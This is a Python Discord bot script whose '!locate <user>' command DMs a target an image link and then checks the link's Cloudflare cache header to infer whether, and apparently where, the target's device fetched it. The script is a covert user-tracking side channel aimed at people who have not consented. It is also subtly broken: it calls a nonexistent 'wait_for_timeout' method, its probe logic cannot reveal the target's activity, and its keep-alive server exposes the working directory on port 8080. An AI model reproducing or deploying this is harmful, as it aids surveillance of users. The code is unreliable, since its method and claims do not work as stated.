import discord
from discord.ext import commands
import requests
import os
import random
import string
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import time

# Get token from Railway env vars
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    raise ValueError("DISCORD_TOKEN environment variable is not set!")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Keep-alive for Railway
def keep_alive():
    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    print("Keeping alive...")
    server.serve_forever()

p = threading.Thread(target=keep_alive)
p.start()

# Store guilds present at startup
initial_guild_ids = None

@bot.event
async def on_ready():
    global initial_guild_ids
    print(f'Bot ready! Logged in as {bot.user}')
    
    # Capture the IDs of all guilds the bot is currently in
    initial_guild_ids = [g.id for g in bot.guilds]
    print(f"Initial Guilds: {initial_guild_ids}")
    
    await bot.change_presence(activity=discord.Game(name="!locate <user>"))

@bot.event
async def on_guild_join(guild):
    # If we have an initial list, check if this guild is NOT in it
    if initial_guild_ids and guild.id not in initial_guild_ids:
        print(f"New guild joined: {guild.name} ({guild.id}). Leaving...")
        try:
            await guild.leave()
            print(f"Left guild: {guild.name}")
        except Exception as e:
            print(f"Failed to leave {guild.name}: {e}")
    else:
        print(f"Existing guild joined or reconnected: {guild.name}")

@bot.command()
async def locate(ctx, user: discord.User):
    # Check if the command was run in DMs
    if ctx.guild is None:
        return 

    # 1. Generate a unique ID
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    # Use a reliable image source that supports CORS and headers
    img_url = f"https://httpbin.org/image/png?r={random_id}" 
    
    # Download and set avatar
    try:
        resp = requests.get(img_url)
        if resp.status_code == 200:
            await ctx.bot.user.edit(avatar=resp.content)
            print(f"Avatar set to: {img_url}")
        else:
            await ctx.send("Failed to download image.")
            return
    except Exception as e:
        await ctx.send(f"Error setting avatar: {e}")
        return

    # 2. Send DM
    try:
        await user.send(f"Test Image: {img_url}") 
        await ctx.send(f"Sent DM to {user.name}. Waiting...")
    except discord.Forbidden:
        await ctx.send(f"Cannot DM {user.name}.")
        return

    # 3. Wait for device to process
    await ctx.send("Waiting 20 seconds for device to fetch asset...")
    await bot.wait_for_timeout(20)

    # 4. Probe Cache Status
    headers = {'User-Agent': 'Mozilla/5.0'}
    
    try:
        start_time = time.time()
        probe_resp = requests.head(img_url, headers=headers, timeout=5)
        elapsed = time.time() - start_time
        
        cf_status = probe_resp.headers.get('cf-cache-status', 'Unknown')
        
        if probe_resp.status_code == 200:
            if cf_status == 'HIT':
                await ctx.send(f"✅ **Cloudflare Cache HIT!** ({cf_status})")
                await ctx.send("This suggests the asset was served from edge cache.")
            elif cf_status == 'MISS':
                await ctx.send(f"❌ **Cloudflare Cache MISS.** ({cf_status})")
                await ctx.send("The target likely did not fetch the asset yet.")
            else:
                await ctx.send(f"⚠️ **No CF Cache Header.** Response Time: {elapsed:.2f}s")
                
        else:
            await ctx.send(f"❌ Failed to probe image. Status: {probe_resp.status_code}")

    except Exception as e:
        await ctx.send(f"Error probing: {e}")

bot.run(TOKEN)